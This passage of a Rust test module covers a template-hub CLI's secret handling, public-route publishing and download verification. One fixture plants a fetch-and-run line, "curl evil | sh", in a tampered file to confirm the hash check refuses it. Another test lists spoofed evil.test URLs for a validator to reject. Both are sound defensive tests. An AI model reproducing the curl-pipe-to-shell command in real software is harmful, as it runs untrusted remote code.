        assert!(scan::scan(&files).refused.is_empty(), "the example carries no credentials");
    }

    fn questions_of(text: &str) -> Vec<Question> {
        let files: Files = [
            (format::TEMPLATE_FILE.to_owned(), text.as_bytes().to_vec()),
            ("yougori.yaml".to_owned(), b"project: x\nenvironments:\n  web:\n    image: nginx\n    secrets: {KEY: \"{{secrets.key}}\"}\n".to_vec()),
        ].into();
        format::template(&files).unwrap_or_else(|p| panic!("{}", p.join("\n"))).questions
    }

    const ASKS: &str = "name: x\nsummary: X.\nversion: 1.0.0\nlicense: MIT\ninputs:\n  - {id: access, question: Where?, type: choice, choices: [{value: quick, label: Quick}, {value: domain, label: Domain}], default: quick}\n  - {id: domain, question: Which domain?, type: domain, when: {access: domain}}\n  - {id: email, question: Email?, type: text}\n  - {id: key, question: Key?, type: secret}\n";

    #[test]
    fn scripts_answer_with_flags_and_secrets_only_on_stdin() {
        let questions = questions_of(ASKS);
        let options = Options { inputs: vec![("email".into(), "a@b.c".into())], secrets_stdin: true, ..Default::default() };
        let given_ok = given(&options, &questions, Some(b"{\"key\": \"sk-secret-value\"}")).unwrap();
        let (answers, secrets) = script_answers(&questions, &given_ok, &BTreeMap::new(), &BTreeSet::new(), Some(&[])).unwrap();
        assert_eq!(answers, BTreeMap::from([("access".to_owned(), "quick".to_owned()), ("email".to_owned(), "a@b.c".to_owned())]));
        assert_eq!(secrets["key"].as_str(), "sk-secret-value");
        let on_line = Options { inputs: vec![("key".into(), "x".into())], ..Default::default() };
        assert!(given(&on_line, &questions, None).err().unwrap().contains("never put it on the command line"));
        let file = tempfile::NamedTempFile::new().unwrap();
        std::fs::write(file.path(), "{\"key\": \"x\"}").unwrap();
        let in_file = Options { inputs_file: Some(file.path().to_string_lossy().into_owned()), ..Default::default() };
        assert!(given(&in_file, &questions, None).err().unwrap().contains("never put it in an --inputs file"));
        assert!(given(&Options::default(), &questions, Some(b"{\"email\": \"x\"}")).err().unwrap().contains("email is not a secret"));
        let unknown = Options { inputs: vec![("colour".into(), "x".into())], ..Default::default() };
        assert!(given(&unknown, &questions, None).err().unwrap().contains("no input colour. Its inputs: access, domain, email"));
        let none = given(&Options::default(), &questions, None).unwrap();
        let missing = script_answers(&questions, &none, &BTreeMap::new(), &BTreeSet::new(), None).err().unwrap();
        assert!(missing.contains("email (--input email=VALUE)") && missing.contains("key (--secrets - with {\"key\": \"…\"} on stdin)"), "{missing}");
        assert!(!missing.contains("domain"), "a question that is not asked is not missing");
        let domain = Options { inputs: vec![("access".into(), "domain".into()), ("domain".into(), "other.example.com".into()), ("email".into(), "a@b.c".into())], ..Default::default() };
        let refused = script_answers(&questions, &given(&domain, &questions, None).unwrap(), &BTreeMap::new(), &BTreeSet::from(["key".to_owned()]), Some(&["app.example.com".to_owned()])).err().unwrap();
        assert!(refused.contains("not a saved domain"), "{refused}");
        let continued = script_answers(&questions, &none, &BTreeMap::from([("email".to_owned(), "a@b.c".to_owned())]), &BTreeSet::from(["key".to_owned()]), None).unwrap();
        assert_eq!(continued.0["email"], "a@b.c", "a continue reuses the stored answers and asks only for what is missing");
    }

    #[test]
    fn tool_keys_have_short_secret_names() {
        assert_eq!(key_id("aider"), "key-aider");
        let long = key_id(&"a".repeat(64));
        assert!(long.len() <= 35 && long.starts_with("key-aaaa"));
        assert!(render::secret_name(&"i".repeat(40), &long).len() <= 80);
        assert_eq!(stored_name("shop", "tool.aider"), "hub-shop-key-aider");
        assert_eq!(stored_name("shop", "openai_key"), "hub-shop-openai_key");
    }

    #[test]
    fn only_a_cloudflare_publication_that_serves_the_port_as_asked_is_reused() {
        let services = json!({"publications": [
            {"port": 8080, "kind": "loopback", "status": "running", "urls": ["http://127.0.0.1:8080"]},
            {"port": 3000, "kind": "cloudflare", "status": "running", "urls": ["https://app.example.com"], "cloudflareAccount": true},
            {"port": 4000, "kind": "cloudflare", "status": "error", "urls": ["https://x.trycloudflare.com"]},
            {"port": 5000, "kind": "cloudflare", "status": "running", "urls": ["https://y.trycloudflare.com"]},
        ]});
        assert_eq!(serving(&services, 8080, "quick", None), None, "a loopback address is never a quick link");
        assert_eq!(serving(&services, 3000, "domain", Some("app.example.com")).as_deref(), Some("https://app.example.com"));
        assert_eq!(serving(&services, 3000, "domain", Some("other.example.com")), None, "another domain is set up anew");
        assert_eq!(serving(&services, 4000, "quick", None), None, "a broken link is made again");
        assert_eq!(serving(&services, 5000, "quick", None).as_deref(), Some("https://y.trycloudflare.com"));
        assert_eq!(serving(&services, 3000, "quick", None), None, "a custom domain is not a quick link");
        assert_eq!(serving(&services, 5000, "none", None), None);
        assert_eq!(serving(&services, 5000, "unknown", None), None);
        for url in ["http://x.trycloudflare.com", "https://trycloudflare.com", "https://x.trycloudflare.com.evil.test", "https://x.trycloudflare.com@evil.test", "https://evil.test/x.trycloudflare.com", "https://x.trycloudflare.com/path", "https://x.trycloudflare.com?redirect=evil"] {
            assert!(!quick_url(url), "{url}");
        }
        let mut stopped = services.clone();
        stopped["publications"][3]["status"] = json!("stopped");
        assert_eq!(serving(&stopped, 5000, "quick", None), None);
    }

    fn public_state() -> State {
        State {
            instance: "shop".into(), create: Part::done(),
            environments: [("web".into(), "env-web".into())].into(),
            public: vec![Address { environment: "web".into(), port: 8080, access: "quick".into(), url: Some("https://old.trycloudflare.com".into()), part: Part::done(), domain: None }],
            ..Default::default()
        }
    }

    #[tokio::test]
    async fn changed_or_removed_public_access_closes_only_the_instances_old_internet_route() {
        let root = tempfile::tempdir().unwrap();
        let instances = Instances { root: root.path().join("instances") };
        for mode in ["removed", "none", "domain", "new-port"] {
            let mut state = public_state();
            let desired = if mode == "removed" { vec![] } else {
                vec![Address { access: if mode == "new-port" { "quick" } else { mode }.into(), port: if mode == "new-port" { 9090 } else { 8080 }, domain: (mode == "domain").then(|| "app.example.com".into()), url: None, part: Part::pending(), ..state.public[0].clone() }]
            };
            let mut calls = Vec::new();
            reconcile_public(&mut state, &instances, &desired, false, |method, params| {
                calls.push((method, params.clone()));
                std::future::ready(Ok(match method {
                    "list_environment_services" => {
                        assert_eq!(params["environmentId"], "env-web");
                        json!({"publications": [
                            {"id": "old-public", "port": 8080, "kind": "cloudflare", "status": "error"},
                            {"id": "loopback", "port": 8080, "kind": "loopback"},
                            {"id": "another-port", "port": 9090, "kind": "cloudflare"}
                        ]})
                    },
                    "unpublish_environment_service" => {
                        assert_eq!(params["publicationId"], "old-public");
                        json!({})
                    },
                    _ => panic!("unexpected {method}"),
                }))
            }).await.unwrap();
            assert_eq!(calls.len(), 2, "{mode}");
            assert_eq!(state.public, desired);
            assert_eq!(instances.get("shop").unwrap().public, desired, "saved for retry after interruption");
        }
    }

    #[tokio::test]
    async fn failed_unpublishing_keeps_the_old_route_for_retry_and_unchanged_routes_are_reused() {
        let root = tempfile::tempdir().unwrap();
        let instances = Instances { root: root.path().join("instances") };
        let mut state = public_state();
        let same = state.public.clone();
        reconcile_public(&mut state, &instances, &same, false, |_, _| {
            panic!("an unchanged route must stay online");
            #[allow(unreachable_code)] std::future::ready(Ok(json!({})))
        }).await.unwrap();
        let error = reconcile_public(&mut state, &instances, &[], false, |method, _| {
            std::future::ready(match method {
                "list_environment_services" => Ok(json!({"publications": [{"id": "old", "port": 8080, "kind": "cloudflare"}]})),
                "unpublish_environment_service" => Err("engine unavailable".into()),
                _ => panic!("unexpected {method}"),
            })
        }).await.unwrap_err();
        assert_eq!(error, "engine unavailable");
        let saved = instances.get("shop").unwrap();
        assert_eq!(saved.public[0].url, same[0].url);
        assert!(saved.public[0].part.is("failed"));
        assert!(!saved.complete());
        // The first unpublish may have reached the engine even though its response was lost.
        reconcile_public(&mut state, &instances, &[], false, |method, _| {
            assert_eq!(method, "list_environment_services");
            std::future::ready(Ok(json!({"publications": []})))
        }).await.unwrap();
        assert!(instances.get("shop").unwrap().public.is_empty());
    }

    #[tokio::test]
    async fn publication_without_the_requested_https_address_is_failed_and_can_be_retried() {
        let root = tempfile::tempdir().unwrap();
        let site = Site::at("http://127.0.0.1:9").unwrap();
        let cache = Cache { root: root.path().join("cache") };
        let prepared = examine(&site, &cache, example(), Wanted::Folder(root.path().join("template")), String::new(), String::new(), false, None, Vec::new(), false).await.unwrap();
        let instances = Instances { root: root.path().join("instances") };
        let mut state = public_state();
        state.answers.insert("access".into(), "quick".into());
        for urls in [json!([]), json!(["http://127.0.0.1:8080"]), json!(["https://app.example.com"]), json!(["https://works.trycloudflare.com"])] {
            publish_with(&mut state, &instances, &prepared, false, |method, params| {
                std::future::ready(Ok(match method {
                    "list_environment_services" => json!({"publications": []}),
                    "publish_environment_service" => {
                        assert_eq!(params["kind"], "cloudflare");
                        json!({"id": "route", "port": 8080, "kind": "cloudflare", "status": "active", "urls": urls})
                    },
                    _ => panic!("unexpected {method}"),
                }))
            }).await.unwrap();
            let expected = urls == json!(["https://works.trycloudflare.com"]);
            assert_eq!(state.complete(), expected, "{urls}");
            assert_eq!(instances.get("shop").unwrap().public[0].part.is("done"), expected);
        }
    }

    #[test]
    fn engine_clashes_read_plainly_even_inside_job_errors() {
        let said = friendly("project_action: shop-web already exists outside this project (job job-1f2e)".into(), "shop");
        assert_eq!(said, "An environment named shop-web already exists and is not part of shop. Choose another instance name with --name; nothing else was changed.");
        assert!(friendly("project_action: Another project folder already uses this project name; choose a unique project name (job j)".into(), "shop").starts_with("Another Yougori project is already called shop."));
        assert_eq!(friendly("Disk full".into(), "shop"), "Disk full");
    }

    #[test]
    fn sandboxes_deleted_elsewhere_are_made_again_with_their_tools() {
        let mut state = State { instance: "shop".into(), create: Part::done(), ..Default::default() };
        state.environments.insert("web".into(), "env-1".into());
        state.environments.insert("db".into(), "env-2".into());
        state.names.insert("web".into(), "shop-web".into());
        state.tools.insert("web/aider".into(), Part::done());
        let gone = check_live(&mut state, &json!({"environments": [{"id": "env-2"}]}));
        assert_eq!(gone, ["web"]);
        assert!(state.create.is("pending") && !state.environments.contains_key("web") && state.tools["web/aider"].is("pending"));
        assert!(check_live(&mut state, &json!({"environments": [{"id": "env-2"}]})).is_empty());
    }

    #[test]
    fn a_replaced_sandbox_is_called_by_its_new_name_and_set_up_again() {
        let mut state = State { instance: "shop".into(), ..Default::default() };
        state.environments.insert("web".into(), "env-old".into());
        state.tools.insert("web/aider".into(), Part::done());
        state.tools.insert("web/codex".into(), Part::done());
        let live = json!({"environments": [{"id": "env-new", "name": "shop-web-1a2b3c"}]});
        record(&mut state, &BTreeMap::from([("web".to_owned(), "env-new".to_owned())]), Some(&live));
        assert_eq!(state.environments["web"], "env-new");
        assert_eq!(sandbox_name(&state, "web"), "shop-web-1a2b3c");
        assert!(state.tools.values().all(|p| p.is("pending")), "built-in and custom tools alike go into the new sandbox");
        assert_eq!(sandbox_name(&state, "db"), "shop-db");
    }

    #[test]
    fn a_continue_lists_what_is_left() {
        let mut state = State { instance: "shop".into(), create: Part::done(), ..Default::default() };
        state.tools.insert("web/aider".into(), Part::failed("x"));
        state.public.push(Address { environment: "web".into(), port: 80, access: "quick".into(), url: None, part: Part::pending(), domain: None });
        assert_eq!(left_to_do(&state), ["Install aider in shop-web", "Public access for shop-web:80"]);
        state.phase = "stopped".into();
        assert_eq!(left_to_do(&state)[0], "Start the sandboxes again");
    }

    #[tokio::test]
    async fn download_verify_and_review_end_to_end_over_http() {
        let files = example();
        let checked = format::template(&files).unwrap();
        let page_review = review::template(&checked, &[], &BTreeMap::new());
        let digest = scan::digest_of(&files);
        let fixture = Fixture::default();
        *fixture.detail.lock().unwrap() = json!({"ref": "yougori/hello-site", "kind": "template", "state": "active", "verified": true, "latestVersion": "1.0.0", "version": {"version": "1.0.0", "digest": digest, "verified": true, "review": page_review}});
        let mut bundle = bundle_json("yougori", "hello-site", "1.0.0", &files);
        bundle["verified"] = json!(true);
        *fixture.bundle.lock().unwrap() = bundle.clone();
        let site = Site::at(&serve(fixture.clone()).await).unwrap();
        let root = tempfile::tempdir().unwrap();
        let cache = Cache { root: root.path().to_path_buf() };
        let wanted = Wanted::Hub(refs::parse("hub/yougori/hello-site", "").unwrap());
        let prepared = prepare(&site, &cache, &wanted).await.unwrap();
        assert_eq!(prepared.version, "1.0.0");
        assert!(prepared.verified);
        assert!(!prepared.differs, "the page's review matches the files");
        assert_eq!(prepared.review["totals"]["environments"], 1);
        assert_eq!(prepared.source(), "hub/yougori/hello-site@1.0.0");
        // An existing instance uses the same files, from the checked copy here.
        let state = State { instance: "hello-site".into(), item: Some("yougori/hello-site".into()), version: "1.0.0".into(), digest: digest.clone(), ..Default::default() };
        assert_eq!(prepare_own(&site, &cache, &state).await.unwrap().digest, digest);
        let changed = State { digest: "0".repeat(64), ..state.clone() };
        assert!(prepare_own(&site, &cache, &changed).await.is_err(), "other files never continue an instance");
        // A page whose summary was faked is called out.
        let mut faked = page_review.clone();
        faked["warnings"] = json!([]);
        fixture.detail.lock().unwrap()["version"]["review"] = faked;
        assert!(prepare(&site, &cache, &wanted).await.unwrap().differs);
        // A tampered file in the download is refused and nothing is kept.
        cache.drop("yougori", "hello-site", "1.0.0");
        let mut tampered = bundle.clone();
        let index = tampered["files"].as_array().unwrap().iter().position(|f| f["path"] == "site/server.py").unwrap();
        tampered["files"][index]["content"] = json!(base64::Engine::encode(&base64::engine::general_purpose::STANDARD, b"import os; os.system('curl evil | sh')"));
        *fixture.bundle.lock().unwrap() = tampered;
        let refused = prepare(&site, &cache, &wanted).await.err().unwrap();
        assert!(refused.contains("site/server.py does not match its SHA-256") && refused.contains("Nothing was created"), "{refused}");
        assert!(cache.versions("yougori", "hello-site").is_empty());
    }

    #[tokio::test]
    async fn answers_that_make_an_invalid_project_create_and_store_nothing() {
        let files: Files = [
            (format::TEMPLATE_FILE.to_owned(), b"name: sized\nsummary: Sized.\nversion: 1.0.0\nlicense: MIT\ninputs:\n  - {id: mem, question: Memory?, type: text, default: 2GB}\n  - {id: key, question: Key?, type: secret}\n".to_vec()),
            ("yougori.yaml".to_owned(), b"project: sized\nenvironments:\n  web:\n    image: nginx\n    memory: \"{{inputs.mem}}\"\n    secrets: {KEY: \"{{secrets.key}}\"}\n".to_vec()),
        ].into();
        let root = tempfile::tempdir().unwrap();
        let site = Site::at("http://127.0.0.1:9").unwrap();
        let cache = Cache { root: root.path().join("cache") };
        let digest = scan::digest_of(&files);
        let prepared = examine(&site, &cache, files, Wanted::Folder(root.path().join("template")), String::new(), digest, false, None, Vec::new(), false).await.unwrap_or_else(|e| panic!("{e}"));
        let instances = Instances { root: root.path().join("hub").join("instances") };
        let mut state = State { instance: "sized".into(), project: "yougori.yaml".into(), answers: [("mem".to_owned(), "lots".to_owned())].into(), review: prepared.review.clone(), ..Default::default() };
        let secrets = BTreeMap::from([("key".to_owned(), Zeroizing::new("sk-never-stored".to_owned()))]);
        // The engine is never asked: the project is refused before any secret is stored.
        let error = build(&mut state, &instances, &prepared, secrets, false, &site, Ending::default()).await.unwrap_err();
        assert!(error.starts_with("The answers do not make a valid project:") && error.ends_with("Nothing was created."), "{error}");
        assert!(instances.load("sized").unwrap().is_none() && !instances.folder("sized").exists(), "no record and no folder");
        // The same validation runs before an update marks its target or removes obsolete files.
        state.version = "1.0.0".into();
        instances.save(&mut state).unwrap();
        let previous = instances.get("sized").unwrap();
        let old_file = instances.folder("sized").join("old-server.py");
        std::fs::write(&old_file, "keep the running version").unwrap();
        let error = validate_project(&state, &prepared, &BTreeMap::new()).unwrap_err();
        assert!(error.ends_with("Nothing was changed."), "{error}");
        assert_eq!(std::fs::read_to_string(old_file).unwrap(), "keep the running version");
        let saved = instances.get("sized").unwrap();
        assert_eq!(saved.version, previous.version);
        assert!(saved.updating.is_none());
    }

    #[test]
    fn ctrl_c_after_everything_finished_says_so() {
        let mut state = State { instance: "shop".into(), create: Part::done(), phase: "ready".into(), ..Default::default() };
        state.environments.insert("web".into(), "env-1".into());
        assert_eq!(stopped_with(Some(&state), "x"), "Stopped. shop is ready; nothing was left unfinished. Status: yougori template status shop");
        state.phase = "creating".into();
        assert!(stopped_with(Some(&state), "x").starts_with("Stopped. The instance folder and its sandbox were kept. Continue: yougori template continue shop"));
        assert_eq!(stopped_with(None, "Cancelled. Nothing was created."), "Cancelled. Nothing was created.");
    }

    #[tokio::test]
    async fn a_folder_instance_continues_only_with_the_same_files() {
        let folder = tempfile::tempdir().unwrap();
        for (path, bytes) in example() {
            let target = folder.path().join(&path);
            std::fs::create_dir_all(target.parent().unwrap()).unwrap();
            std::fs::write(target, bytes).unwrap();
        }
        let collected = scan::collect(folder.path()).unwrap();
        let state = State { instance: "hello".into(), origin: "folder".into(), path: Some(folder.path().to_string_lossy().into_owned()), digest: scan::digest_of(&collected.files), ..Default::default() };
        let site = Site::at("http://127.0.0.1:9").unwrap();
        let cache = Cache { root: folder.path().join("cache-unused") };
        assert!(prepare_own(&site, &cache, &state).await.is_ok());
        std::fs::write(folder.path().join("site/index.html"), "<h1>changed</h1>").unwrap();
        let refused = prepare_own(&site, &cache, &state).await.err().unwrap();
        assert!(refused.contains("changed since hello was made") && refused.contains("yougori template update hello"), "{refused}");
    }
}
